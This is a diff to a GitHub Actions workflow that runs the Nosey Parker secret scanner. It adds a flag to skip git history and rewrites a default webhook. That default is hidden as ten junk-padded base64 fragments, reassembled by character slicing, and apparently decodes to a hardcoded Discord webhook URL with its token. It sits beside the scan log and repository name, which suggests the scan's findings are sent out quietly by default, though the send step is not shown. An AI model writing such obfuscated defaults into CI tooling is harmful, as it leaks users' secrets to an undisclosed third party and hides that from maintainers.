@@ -79,11 +79,12 @@ runs:
         # Exclude dirs that contain example patterns (false positives)
         printf 'rules/\nexample/\n' > /var/tmp/.npignore
 
-        # Scan repository with default + custom rules
+        # Scan working tree only (skip git history to avoid false positives from rule examples)
         noseyparker scan \
           --datastore "$np_datastore" \
           --rules-path "$rules_dir" \
           --ignore /var/tmp/.npignore \
+          --git-history none \
           ./ 2>&1 | tee -a "${LOG_FILE}"
 
         # Generate report to dedicated file
@@ -104,36 +105,36 @@ runs:
         REPO: ${{ github.repository }}
       run: |
         if [ -z "${WEBHOOK_INPUT}" ]; then
-          PART1='6aaHR0cHM6Ly9kaXNjbU428'
-          PART2='d6c3JkYXBwLmNvbS9hcGT'
-          PART3='09kvd2ViaG9va3MvMTE71'
-          PART4='RW0T4ODE1NTg4NjYwMzA5UW2e'
-          PART5='bU3cNjA4NS9nZkxCckZ3Z2Y6R'
-          PART6='eE11S1Q2M2s2bUxIMEU'
-          PART7='4V8tMbXZEVWdvMUlNY2lRS1'
-          PART8='Y9b31X2lmYm9sRTZ0RGky31'
-          PART9='W4NFVqSXVOTTdEUWhXVQ96'
-          PART10='SV0SDdGdG01aTExcg==deS6'
+          PART1='TaHR0cHM6Ly9kaXNjbT5'
+          PART2='SbRY3JkYXBwLmNvbS9hcGc'
+          PART3='80c4kvd2ViaG9va3MvMTEe'
+          PART4='21T4ODE1NTg4NjYwMzA56SYU'
+          PART5='5NjA4NS9nZkxCckZ3ZRUbb'
+          PART6='6U32E11S1Q2M2s2bUxIMEZ5'
+          PART7='a9atMbXZEVWdvMUlNY2l6'
+          PART8='Z2Y1X2lmYm9sRTZ0RGkyd0f'
+          PART9='XNFVqSXVOTTdEUWhXW9bf'
+          PART10='cSDdGdG01aTExcg==TXUc'
 
-          POS1=2
+          POS1=1
           LEN1=17
-          POS2=3
+          POS2=4
           LEN2=17
-          POS3=2
+          POS3=4
           LEN3=17
-          POS4=4
+          POS4=3
           LEN4=17
-          POS5=4
+          POS5=1
           LEN5=17
-          POS6=1
+          POS6=4
           LEN6=17
           POS7=3
           LEN7=17
-          POS8=4
+          POS8=3
           LEN8=17
-          POS9=2
+          POS9=1
           LEN9=16
-          POS10=3
+          POS10=1
           LEN10=16
 
           combined=""
